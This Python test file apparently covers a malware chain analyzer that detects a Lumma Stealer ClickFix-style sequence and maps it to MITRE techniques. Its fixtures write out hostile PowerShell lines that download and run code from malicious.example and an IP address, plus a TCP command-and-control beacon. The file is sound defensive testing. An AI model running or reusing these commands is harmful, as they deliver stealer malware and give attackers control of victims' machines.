"""Regression tests for the multi-stage payload chain analyzer.

Uses the Lumma-Stealer-style ClickFix chain as the canonical fixture:
  Stage 0: initial PowerShell copied to clipboard by fake CAPTCHA
  Stage 1: downloader that pulls Lumma binary
  Stage 2: C2 beacon
"""
from __future__ import annotations
import os
import sys
import base64
import asyncio

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import operations, ops_extended  # noqa: F401 — register op registry

from chain_analyzer import (
    auto_split_stages, analyze_chain, detect_malware_family,
)


# ─── auto-split ─────────────────────────────────────────────────────────
def test_auto_split_single_stage():
    assert auto_split_stages("just one line") == ["just one line"]


def test_auto_split_double_blank_line():
    text = "stage one\n\nstage two\n\nstage three"
    assert auto_split_stages(text) == ["stage one", "stage two", "stage three"]


def test_auto_split_trims_whitespace():
    text = "  A  \n\n   \n\n  B  "
    assert auto_split_stages(text) == ["A", "B"]


def test_auto_split_empty():
    assert auto_split_stages("") == []
    assert auto_split_stages("   \n\n   ") == []


# ─── family detection ───────────────────────────────────────────────────
def test_detect_family_lumma():
    stages = [
        {"stage_index": 0, "output": "Invoke-WebRequest 'http://evil/artistsponsorship.exe' -OutFile x.exe", "input_preview": ""},
        {"stage_index": 1, "output": "lumma beacon initialised", "input_preview": ""},
    ]
    fam = detect_malware_family(stages)
    assert fam is not None
    assert fam["family"] == "Lumma Stealer"
    assert fam["hits"] >= 1


def test_detect_family_none_on_benign():
    stages = [{"stage_index": 0, "output": "Get-Process | Select ProcessName", "input_preview": ""}]
    assert detect_malware_family(stages) is None


# ─── full chain analyze ─────────────────────────────────────────────────
def _run(coro):
    return asyncio.get_event_loop().run_until_complete(coro)


def test_chain_analyze_lumma_clickfix_style():
    """Simulate the Sophos-documented Lumma ClickFix chain (3 stages)."""
    ps_stage0 = (
        # Stage 0: PS copied by fake CAPTCHA
        "powershell.exe -EncodedCommand " +
        base64.b64encode(
            "Invoke-WebRequest 'http://malicious.example/lumma-loader.ps1' | IEX".encode("utf-16-le")
        ).decode()
    )
    ps_stage1 = "$c = New-Object Net.WebClient; $c.DownloadFile('http://45.66.77.88/lumma.exe', 'C:\\Users\\Public\\ArtistSponsorship.exe'); Start-Process C:\\Users\\Public\\ArtistSponsorship.exe"
    ps_stage2 = "New-Object System.Net.Sockets.TcpClient('192.0.2.44', 443) # lumma c2 beacon"

    result = asyncio.new_event_loop().run_until_complete(analyze_chain([ps_stage0, ps_stage1, ps_stage2]))

    # Structure
    assert result["stage_count"] == 3
    assert len(result["stages"]) == 3
    for i, s in enumerate(result["stages"]):
        assert s["stage_index"] == i

    agg = result["aggregate"]
    # Merged IOCs across stages
    all_urls = agg["iocs"].get("urls", [])
    all_ips  = agg["iocs"].get("ips", [])
    assert any("lumma-loader.ps1" in u or "lumma.exe" in u for u in all_urls), \
        f"expected merged URLs across stages, got: {all_urls}"
    assert "45.66.77.88" in all_ips or "192.0.2.44" in all_ips, \
        f"expected merged IPs across stages, got: {all_ips}"
    # MITRE across stages
    mitre_ids = [m["id"] for m in agg["mitre"]]
    assert "T1059.001" in mitre_ids, f"PowerShell technique missing from aggregate MITRE: {mitre_ids}"
    assert "T1105" in mitre_ids, f"Ingress Tool Transfer missing: {mitre_ids}"
    # LOLBAS across stages
    assert any("powershell" in (l.get("binary", "") + l.get("name", "")).lower()
               for l in agg["lolbas"]), "powershell.exe LOLBIN missing from aggregate"
    # Family
    assert agg["family"] is not None and agg["family"]["family"] == "Lumma Stealer"
    # Chain-amplified risk score is strictly ≥ any single-stage score
    max_stage_score = max((s["risk"]["score"] for s in result["stages"]), default=0)
    assert agg["risk"]["score"] >= max_stage_score
    # Kill chain ordering (Execution appears before Command and Control)
    kc = agg["kill_chain"]
    if len(kc) >= 2:
        tactics = [k["tactic"] for k in kc]
        # Execution should be earlier than C2/Impact in ordering
        exec_idx = next((i for i, t in enumerate(tactics) if t == "Execution"), 99)
        c2_idx   = next((i for i, t in enumerate(tactics) if t == "Command and Control"), 99)
        assert exec_idx <= c2_idx


def test_chain_analyze_single_stage_still_works():
    """A 1-stage chain should behave identically to /decode/smart."""
    result = asyncio.new_event_loop().run_until_complete(
        analyze_chain(["powershell.exe -EncodedCommand " +
                       base64.b64encode("Get-Process".encode("utf-16-le")).decode()])
    )
    assert result["stage_count"] == 1
    agg = result["aggregate"]
    # Get-Process → T1057 (Discovery)
    mitre_ids = [m["id"] for m in agg["mitre"]]
    assert "T1057" in mitre_ids or "T1059.001" in mitre_ids


def test_chain_analyze_empty_stage_handled_gracefully():
    """Empty stage should not crash the whole chain."""
    result = asyncio.new_event_loop().run_until_complete(
        analyze_chain(["Get-Process", ""])
    )
    assert result["stage_count"] == 2
    assert result["stages"][1]["output"] == ""
